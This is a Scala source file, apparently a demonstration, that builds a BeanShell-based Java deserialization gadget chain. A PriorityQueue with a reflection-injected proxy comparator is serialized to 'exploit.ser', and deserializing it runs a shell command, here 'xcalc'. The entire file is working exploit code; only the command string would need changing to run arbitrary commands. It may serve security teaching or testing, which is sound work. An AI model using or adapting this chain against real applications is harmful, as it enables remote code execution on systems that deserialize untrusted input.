import java.io._
import bsh._
import java.lang.reflect.Proxy
import java.lang.reflect.Field
import java.lang.reflect.InvocationHandler
import java.util.Comparator
import java.util.PriorityQueue

object SerializationDemo extends App {

  // Create gadget chain
  val payload:String = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"xcalc\"}).start();return new Integer(1);}"
  val i:Interpreter = new Interpreter()
  i.eval(payload)
  val xt:XThis = new XThis(i.getNameSpace(), i)

  val handler_field:Field = xt.getClass().getDeclaredField("invocationHandler")
  handler_field.setAccessible(true)
  val handler = handler_field.get(xt).asInstanceOf[InvocationHandler]
  val comparator = Proxy.newProxyInstance(classOf[Comparator[Object]].getClassLoader(), Array(classOf[Comparator[Object]]), handler).asInstanceOf[Comparator[Object]]

  val priorityQueue = new PriorityQueue(2, comparator)
  var queue:Array[Object] = new Array[Object](2)
  queue(0) = ""
  queue(1) = ""
  val field1 = priorityQueue.getClass().getDeclaredField("queue")
  field1.setAccessible(true)
  field1.set(priorityQueue, queue)
  val field2 = priorityQueue.getClass().getDeclaredField("size")
  field2.setAccessible(true)
  field2.set(priorityQueue, 2)

  // Serialization
  val exploit_oos = new ObjectOutputStream(new FileOutputStream("exploit.ser"))
  exploit_oos.writeObject(priorityQueue)
  exploit_oos.close

  // Deserialization
  val pois = new ObjectInputStream(new FileInputStream("exploit.ser")) 
  pois.readObject()
  pois.close()
}
